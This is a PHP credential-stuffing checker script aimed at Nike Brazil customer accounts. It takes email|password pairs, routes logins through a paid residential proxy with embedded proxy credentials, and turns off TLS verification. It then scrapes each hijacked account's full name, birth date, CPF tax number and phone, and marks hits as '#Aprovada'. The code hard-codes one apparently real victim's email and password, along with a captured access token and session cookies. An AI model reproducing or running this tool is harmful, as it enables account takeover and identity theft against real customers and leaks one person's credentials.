
<?php
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');
 
 
function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
 
function getStr2($dado, $string, $string2){ // FUNCTION QUE PUXA UM VALOR INDEFINIDO ENTRE DUAS STRINGS QUE NรO MUDAM.
  preg_match_all("($string(.*)$string2)siU", $dado, $match1);
  return $match1[1][0];
 
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$email  = $separar[0];
$senha = $separar[1];
 
 
$username = 'blue3419ankj16047'; 
$password = 'ku9VsvUjT7gv7oOx_country-Brazil'; 
$proxy = 'isp2.hydraproxy.com:9989';


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://unite.nike.com.br/login?appVersion=900&experienceVersion=900&uxid=com.nike.commerce.nikedotcom.brazil.oauth.web&locale=pt_BR&backendEnvironment=identity&browser=Google%20Inc.&os=undefined&mobile=false&native=false&visit=2&visitor=bb44a21d-3396-40a4-b260-a5c4fda62ec8'); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
  'Host: unite.nike.com.br',
  'Connection: keep-alive',
  'X-Sec-Clge-Req-Type: ajax',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36',
  'Content-Type: application/json',
  'Accept: */*',
  'Origin: https://unite.nike.com.br',
  'Referer: https://unite.nike.com.br/oauth.html?client_id=QLegGiUU042XMAUWE4qWL3fPUIrpQTnq&redirect_uri=https%3A%2F%2Fwww.nike.com.br%2Fapi%2Fv2%2Fauth%2Fnike-unite%2Fset&response_type=code&locale=pt_BR&state=%2F',
  'Accept-Encoding: gzip, deflate, br',
  'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
  'Cookie: _ga=GA1.3.1862180973.1622667799; chaordic_browserId=0-DK808LV51tnpT5fCc6qGN2hHUyLDuhNLBNgT16226678002637823; chaordic_anonymousUserId=anon-0-DK808LV51tnpT5fCc6qGN2hHUyLDuhNLBNgT16226678002637823; _gaexp=GAX1.3.baqAp3g1SlGonEufY6fhkw.18846.1; _rtbhouse_source_=organic; user_unic_ac_id=0bcb0df7-3026-bbe0-e5ad-8864732be3a5; advcake_trackid=70deaf7b-a751-f1e0-fe5d-c5689e992a5a; _gcl_au=1.1.1498581696.1622667801; _fbp=fb.2.1622667801351.1414520328; lmd_orig=direct; Campanha=; Midia=; chaordic_testGroup=%7B%22experiment%22%3Anull%2C%22group%22%3Anull%2C%22testCode%22%3Anull%2C%22code%22%3Anull%2C%22session%22%3Anull%7D; IFCSHOPSESSID=d05mbqmdcu9lpri08qqrdbt545; bm_sz=DC6999C8A7668845484BA48333D2F6E6~YAAQ8ZaVyE5d5e55AQAAhh2hMQx40xMJsz5qUu/sJqzh/noz10Cx3u2d3pTEiNWd2oRCXuQXttIMz3lHKZHMv2BnjJ0fRXx6Je3UMeEeePFA0eZF8sxgjEW8PUNKnGHFOHoxsRoERmhU4aicwFcLEVlJNB2SWoHIZ3BHncOY+jGRJMN0LIUNlyLUDPO4PsUfkVSkKSnOpUQdlD+RVyXpRB68YoVpcZ9Mjjk44hETC6hpIhkQEXTaKr/yKK6gBLXPOXf8AeUyjgGJHMobh9vUhyZc2RF+e32h50x4; chaordic_session=1624330280147-0.7682175005387046; _gid=GA1.3.1082686894.1624330280; gpv_v70=nikecombr%3Ehomepage; pv_templateName=HOME; gptype_v60=homepage; s_cc=true; _st_ses=13968752915301086; _ce.s=v11.rlc~1624330282175; _sptid=1592; _spcid=1592; _st_cart_url=/; _st_cart_script=helper_nike.js; _st_no_user=1; anonymousId=3B05B1BAA9033D2F3B927E6598346015; bm_mi=46FC70A36B06AD405DD1F895DA54722B~ONFk+18GKPZumy+QGrcer9pg8EaNcwodCC9moJxkn9CzrJXjZ/7e7C4uOeFtbcB36LaA73iwgg9IUz4QHqRlfbsdViNH9mI7RHvGYPnxowHDYQsgVyZyRTzeTwypOG8GDXykEUmYYhkBNKLuKPfQ79giHfoBO90iglUpGM0WTPbU20QAn3Dm6zQHSBY2gSxWwZBu6uoGEvrUgC8tgnpSnpuC38BFhPYgO5z+JuTWxBgA0asJeofywr2ESh3xL+BrIgDmwisowImMvQ1VlHTU/7tBsgR8nuHkMS70LZZZNJk=; ak_bmsc=73C01AA0DBDB3EF2B997D75DF60764A9~000000000000000000000000000000~YAAQ8ZaVyGJd5e55AQAADi+hMQzU92jdF7N5BTTpQ0UAnCZGNqBu8gV/JuIXbwPSBHWXozbnk0OtjPe772xogjG4MWUvfB053iVCnLvj8bp2YLFgWdvabG2MG9S5gKhS01q8O5XJDUvTWBxjiWXrS3L41i70hI5FFbzWCZNcZQcAavFNvdJd8ePfRvfPmYukQozCwMFucoyX7F6UI3jlZRLDWoZo2nUsO63busDiwSnMoAJ/DCW3GNQ9UMDJdReU0DsKGRDUFbtmeMlegOl5ausTMBtsO8zGCTrS4vrxss8S2VVGikfoL+e2mVfL56wIfTfSW6jT2CEWTaJv0oFHBHTQsR+FRiovsrEdoIbvehWrE78kqp5FBc83AvW9yuqjdo+uXoqCnvQ33fqeNgn9xkzhS0PEalXtYZIkMUFLDhNnOZp0KmyA; lmd_traf=direct-1624330281862&direct-1624330281865&direct-1624330301229&direct-1624330301232; _cm_ads_activation_retry=false; _gat_gtag_UA_142883149_1=1; _uetsid=b9f01240d30411eb85812dee728dbf1b; _uetvid=f6639df0c3e511eb9e775964882506a1; lx_sales_channel=1; _spl_pv=46; s_sq=lojanike-new-production%252Clojanike-nikebr%3D%2526c.%2526a.%2526activitymap.%2526page%253Dnikecombr%25253Ehomepage%2526link%253DLogin%252520%25252F%252520Inscreva-se%2526region%253Dheader%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253Dnikecombr%25253Ehomepage%2526pidt%253D1%2526oid%253Dhttps%25253A%25252F%25252Fwww.nike.com.br%25252F%252523%2526ot%253DA; CSRFtoken=f49d30e313b7d7d9de62c6aa5d7080be; RT="z=1&dm=nike.com.br&si=dbf48bef-811c-41b3-b74e-a1d2d38fbe3e&ss=kq7gb4ck&sl=5&tt=7du&bcn=%2F%2F173e252a.akstat.io%2F&obo=2&nu=2dci5c9j&cl=3w20&ld=3w2b&r=4ljf83r0&ul=3w2c&hd=3w2w"; bm_sv=256BCF1222DB59210BD717B8C1EE4ACB~aaCuTe/4rQuKFLb4oRP2ORb/uKaqi6AWC1ZB47d8QKWFoOq4cy6mfCqkW7Fy5PqOOvcCuQSiGi6t20uDMFnj8+Gw/6QaXaqCxIpNEy7BAyrNOkDPZRkwCeZVucxX3i+Oii3YAcQFdS1951m14lf4wtzcoBzXbR/fNX8sbnEZuQQ=; _abck=136A2FA53B8777AEC74F2C0AC3FBA865~-1~YAAQ8ZaVyGNf5e55AQAAtRukMQam4H/m7D44LGo5LXFl95WxQoa6B136cjx+OKUMQudhLPW5Jd6VI5tKCbVIBZkEa9suMpvy4k33GLY3QqanmTv97V5AanJvwTjmcoGDb1lr98909JL9TV4z7fRWyXHdT/zt9+2ra95AFQc3hgyegPdZmuEhSS5EePt2evLAjB4Wgc0+NwD8q1nTlm17/r0iG9OJ88K7vKebfuuXaEWpD43FYHGqzTJke5nRk3RO3s8PPhir2ocZtIvLK88lxkNYlb/z/f4iQohTsZ/P6HJZhz4kVmNzkYkRBZYUaWAUxaON7K2H9R4yQvZLyvJ0mIqFssnvNCB8x/cgVR2dFjV6Sq6XUH9jRmR8zs42+L8IylYLa6LX6/55J1P/poHcdRkeHhbmqGUUlOYeLVZj8dFnGTFdQy6lHns/4aoUwSYKvzzIRBIw66NGlEIwxBQLMARZPbc3CTKE5UxO~-1~-1~-1',
	));
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"username":"apvs.monica@gmail.com","password":"55228910mM","client_id":"QLegGiUU042XMAUWE4qWL3fPUIrpQTnq","ux_id":"com.nike.commerce.nikedotcom.brazil.oauth.web","grant_type":"password"}');
$d1 = curl_exec($ch);
echo $d1;
$access_token = getStr($d1, '"access_token":"', '"');


//","access_token":"eyJhbGciOiJSUzI1NiIsImtpZCI6ImQ5N2ZlZmE3LWQ4NjktNDA2Yy04YjQ1LTJhODdkZGU0N2ZkZXNpZyJ9.eyJ0cnVzdCI6MTAwLCJpYXQiOjE2MjQzMzEwOTgsImV4cCI6MTYyNDMzNDY5OCwiaXNzIjoib2F1dGgyYWNjIiwianRpIjoiYzkwNDdiOTQtOTcxNC00NTY2LTk2MWQtMjIzOWQwMjFkNDUxIiwibGF0IjoxNjI0MzMxMDk4LCJhdWQiOiJjb20ubmlrZS5kaWdpdGFsIiwic3ViIjoiY29tLm5pa2UuY29tbWVyY2UubmlrZWRvdGNvbS5icmF6aWwub2F1dGgud2ViIiwic2J0IjoibmlrZTphcHAiLCJzY3AiOlsibmlrZS5kaWdpdGFsIl0sInBybiI6IjQ2OWU0ZTU5LTNiZTUtNDAyZC05Mjc2LWYxYmJhMGExYjM2ZSIsInBydCI6Im5pa2U6cGx1cyJ9.lbfOsoCsSyhCTggd8m_SnyTvBVdU0wUXuBSL27llw6B0Uq3SvmyFFwfR989x_F15eau7PvhkfUpd9_VuHK2wEBYCsUhudlWuyAZRgcGMlqQMMDSGxnet73dltUBU72mdf0jHS7_4zsg3adi05S5Lw08XOVbP1kILJos9HQGVM8FqjzN6ZxW1go26PHyqR9_sYlpH1dgTGkZ_UCiUb9C2qeztxOhVKDZ491hYN6PFdj_p2mwFgN-9jT-mwFlovScO3tVBingVlM7hdbfbivJKYEh1Dy2eKNj8BNMsrawUByoqilgIZAPGrelEqEfRrhJVHhIW9NQiSkNx1JSCk6oEzg","


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.nike.com.br/minha-conta/alterar-dados-cadastrais');  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
  'Host: www.nike.com.br',
  'Connection: keep-alive',
  'Upgrade-Insecure-Requests: 1',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36',
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'Referer: https://www.nike.com.br/minha-conta',
  'Accept-Encoding: gzip, deflate, br',
  'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
  'Cookie: nikega=GA1.4.1862180973.1622667799; _ga=GA1.3.1862180973.1622667799; chaordic_browserId=0-DK808LV51tnpT5fCc6qGN2hHUyLDuhNLBNgT16226678002637823; chaordic_anonymousUserId=anon-0-DK808LV51tnpT5fCc6qGN2hHUyLDuhNLBNgT16226678002637823; _gaexp=GAX1.3.baqAp3g1SlGonEufY6fhkw.18846.1; _rtbhouse_source_=organic; user_unic_ac_id=0bcb0df7-3026-bbe0-e5ad-8864732be3a5; advcake_trackid=70deaf7b-a751-f1e0-fe5d-c5689e992a5a; _gcl_au=1.1.1498581696.1622667801; _fbp=fb.2.1622667801351.1414520328; blueID=224e925d-d590-42bc-a0ea-6de30583a880; sback_partner=false; sback_client=5816989a58791059954e4c52; smeventsclear_16df2784b41e46129645c2417f131191=true; sb_days=1622667804430; lmd_orig=direct; __pr.cvh=8lbci-ipTh; __privaci_cookie_consent_generated=0df27e34-72ed-4c11-a0a2-3023c15643d8:2; __privaci_cookie_consent_uuid=0df27e34-72ed-4c11-a0a2-3023c15643d8:2; __privaci_cookie_consents={"consents":{"127":1,"129":1,"130":1,"132":1},"location":"SP#BR","lang":"pt-br"}; __udf_j=247bb93f4a29aa783b14ee648df8e60dcb5b8c5ee7e453b5fd5595a32a6cf7826595f88f2e06bd59460186ce2273dda2; Campanha=; Midia=; chaordic_testGroup=%7B%22experiment%22%3Anull%2C%22group%22%3Anull%2C%22testCode%22%3Anull%2C%22code%22%3Anull%2C%22session%22%3Anull%7D; IFCSHOPSESSID=d05mbqmdcu9lpri08qqrdbt545; bm_sz=DC6999C8A7668845484BA48333D2F6E6~YAAQ8ZaVyE5d5e55AQAAhh2hMQx40xMJsz5qUu/sJqzh/noz10Cx3u2d3pTEiNWd2oRCXuQXttIMz3lHKZHMv2BnjJ0fRXx6Je3UMeEeePFA0eZF8sxgjEW8PUNKnGHFOHoxsRoERmhU4aicwFcLEVlJNB2SWoHIZ3BHncOY+jGRJMN0LIUNlyLUDPO4PsUfkVSkKSnOpUQdlD+RVyXpRB68YoVpcZ9Mjjk44hETC6hpIhkQEXTaKr/yKK6gBLXPOXf8AeUyjgGJHMobh9vUhyZc2RF+e32h50x4; nikega_gid=GA1.4.907274693.1624330280; AMCVS_F0935E09512D2C270A490D4D%40AdobeOrg=1; AMCV_F0935E09512D2C270A490D4D%40AdobeOrg=-1124106680%7CMCIDTS%7C18801%7CMCMID%7C11288929882268942924254787474993456641%7CMCAAMLH-1624935080%7C4%7CMCAAMB-1624935080%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1624337480s%7CNONE%7CvVersion%7C5.2.0; chaordic_session=1624330280147-0.7682175005387046; _gid=GA1.3.1082686894.1624330280; s_cc=true; _st_ses=13968752915301086; _ce.s=v11.rlc~1624330282175; _sptid=1592; _spcid=1592; _st_cart_url=/; _st_cart_script=helper_nike.js; _st_no_user=1; bm_mi=46FC70A36B06AD405DD1F895DA54722B~ONFk+18GKPZumy+QGrcer9pg8EaNcwodCC9moJxkn9CzrJXjZ/7e7C4uOeFtbcB36LaA73iwgg9IUz4QHqRlfbsdViNH9mI7RHvGYPnxowHDYQsgVyZyRTzeTwypOG8GDXykEUmYYhkBNKLuKPfQ79giHfoBO90iglUpGM0WTPbU20QAn3Dm6zQHSBY2gSxWwZBu6uoGEvrUgC8tgnpSnpuC38BFhPYgO5z+JuTWxBgA0asJeofywr2ESh3xL+BrIgDmwisowImMvQ1VlHTU/7tBsgR8nuHkMS70LZZZNJk=; ak_bmsc=73C01AA0DBDB3EF2B997D75DF60764A9~000000000000000000000000000000~YAAQ8ZaVyGJd5e55AQAADi+hMQzU92jdF7N5BTTpQ0UAnCZGNqBu8gV/JuIXbwPSBHWXozbnk0OtjPe772xogjG4MWUvfB053iVCnLvj8bp2YLFgWdvabG2MG9S5gKhS01q8O5XJDUvTWBxjiWXrS3L41i70hI5FFbzWCZNcZQcAavFNvdJd8ePfRvfPmYukQozCwMFucoyX7F6UI3jlZRLDWoZo2nUsO63busDiwSnMoAJ/DCW3GNQ9UMDJdReU0DsKGRDUFbtmeMlegOl5ausTMBtsO8zGCTrS4vrxss8S2VVGikfoL+e2mVfL56wIfTfSW6jT2CEWTaJv0oFHBHTQsR+FRiovsrEdoIbvehWrE78kqp5FBc83AvW9yuqjdo+uXoqCnvQ33fqeNgn9xkzhS0PEalXtYZIkMUFLDhNnOZp0KmyA; lmd_traf=direct-1624330281862&direct-1624330281865&direct-1624330301229&direct-1624330301232; _cm_ads_activation_retry=false; sback_browser=0-23238100-1624330401fa59a51a3e391fc27c65838861a9c01f1a40c57f58654204460d150a138bd08-35611767-4523417810,13017616489-1624330401; sback_access_token='.$access_token.'; sback_customer=$2gNyIWQhpWYZd0Mhl1RtdVTXh3dNhWbqpFO4hXSJdVSPhEejFVOXRWTtt2QKZERvpVWzcza4pHaNNTaEZUaUdmW2$12; sback_total_sessions=4; sback_current_session=1; sback_customer_w=true; smViewPushOptin=true; smViewOnSite=true; smClosePushOptin=true; sback_refresh_wp=no; name=value; isLogged=1; _gat_gtag_UA_101374395_1=1; _gat_nikelaunchga=1; _gat_gtag_UA_142883149_1=1; isLogged=true; smeventssent_16df2784b41e46129645c2417f131191=true; gpv_v70=no%20value; pv_templateName=no%20value; gptype_v60=no%20value; _uetsid=b9f01240d30411eb85812dee728dbf1b; _uetvid=f6639df0c3e511eb9e775964882506a1; lx_sales_channel=2; stc119288=env:1624330282%7C20210723025122%7C20210622033509%7C12%7C1088071:20220622030509|uid:1622667801729.628374852.0124841.119288.1597280735.:20220622030509|srchist:1088070%3A1%3A20210703210321%7C1088071%3A1624330282%3A20210723025122:20220622030509|nsc:2:20220604161833|tsa:1624330282001.1846952564.654202.7405986692953386.6:20210622033509; _spl_pv=52; CSRFtoken=96843f558048f610af1aa2d2564d3db2; bm_sv=256BCF1222DB59210BD717B8C1EE4ACB~aaCuTe/4rQuKFLb4oRP2ORb/uKaqi6AWC1ZB47d8QKWFoOq4cy6mfCqkW7Fy5PqOOvcCuQSiGi6t20uDMFnj8+Gw/6QaXaqCxIpNEy7BAyrEhdF+ULuz8Rp99w7RrA2S6Q1R4e3QMMlWlaXip/qIy5ehwuBH7YMvaQI4UekGyDc=; _abck=136A2FA53B8777AEC74F2C0AC3FBA865~-1~YAAQ75aVyCd8WyR6AQAA+mCuMQZpM0gxtXXETfDzMKUnhAOgGYsXzg54oD9/Dc1016ixkiXBQEYq4QQyym0p+JCMj/T6nPH0AY8zHFqjerzLO0VGRDdcER2IpNYYRK93U8XJ429ljIB8Ox2Ul8f7Q2nplu9uOCFbjLaEJc7g1oB6vu4jsyneelwuZO64zpXrhechCwdKIMjY0m/nYrVazeyrYKnrLx8+2Kixv4/ufUKIRxuCkKBRO3GuXdUZoc43JRqsVWLexZWd/T8nmdTDdaFdLK1Vztfh16/zNOA+U7CR/16x6KOG/YxyprCSUhs1Lk+3i0PzdulogsWUrRCwtOjlGk9f7dyp0+1wN0bUSrFbItX4mEBPrW2koE1jyjhMtTvxNlpufj7Fob0aa0vd7UqeoMj3NdAX7oZTLEo4NBKzfMK9sdpvsuRUhaAeoYzQ8gZ7MmOLpKmJklZU/FFa7xya7IC/wRvVKgRO~-1~-1~-1; s_sq=lojanike-new-production%252Clojanike-nikebr%3D%2526c.%2526a.%2526activitymap.%2526page%253Dhttps%25253A%25252F%25252Fwww.nike.com.br%25252Fminha-conta%2526link%253DAlterar%252520meus%252520dados%252520cadastrais%2526region%253Dminha-conta%2526.activitymap%2526.a%2526.c%2526pid%253Dhttps%25253A%25252F%25252Fwww.nike.com.br%25252Fminha-conta%2526oid%253Dhttps%25253A%25252F%25252Fwww.nike.com.br%25252Fminha-conta%25252Falterar-dados-cadastrais%2526ot%253DA; RT="z=1&dm=nike.com.br&si=dbf48bef-811c-41b3-b74e-a1d2d38fbe3e&ss=kq7gb4ck&sl=c&tt=k47&bcn=%2F%2F173e252a.akstat.io%2F&obo=4&ld=hu05&nu=yncof66&cl=incc&ul=incq"',
	));
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
$d2 = curl_exec($ch);
echo $d2;

$nome = getStr($d2, '<input type="text" class="element-input" id="Nome" name="Nome" value="', '"');
echo $nome;
$fullName = getStr($d2, '');
$fullName = getStr($d2, '');
$fullName = getStr($d2, '');
$fullName = getStr($d2, '');
$fullName = getStr($d2, '');
$fullName = getStr($d2, '');
$fullName = getStr($d2, '');

//<input type="text" class="element-input" id="Nome" name="Nome" value="Monica" placeholder="Primeiro nome"


$fullName = getStr($d2, '"fullName":"', '"');
$birthday = getStr($d2, '"birthday":"', '",');
$cpf = getStr($d2, '"cpf":"', '",');
$ddd = getStr($d2, '"cellphone":{"ddd":"', '",');
$number = getStr($d2, '"cellphone":{"ddd":"'.$ddd.'","number":"', '"');
$status = getStr($d2, '"status":"', '",');




     if(stristr($d1,'AUTHENTICATED') !== false){
        echo '  
<div class="alert alert-fixed alert-success alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-check"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Aprovada </strong> '.$email.'|'.$senha.' → Nome: '.$fullName.' | Data: '.$birthday.' | CPF: '.$cpf.' | Telefone: '.$ddd.''.$number.' | Status: '.$status.' <strong></strong></p>
                                  </div>
 
                         
  </div>
                                </div>
                                 
';
	 }
	
else{
        echo '               
<div class="alert alert-fixed alert-danger alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-close-circle"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Reprovada </strong> '.$email.'|'.$senha.' Return → '.$d1.' <strong> </strong></p>
                                  </div>
 
                         
  </div>
                                </div>
';

}

curl_close($ch);
 ob_flush();        
                             
?>
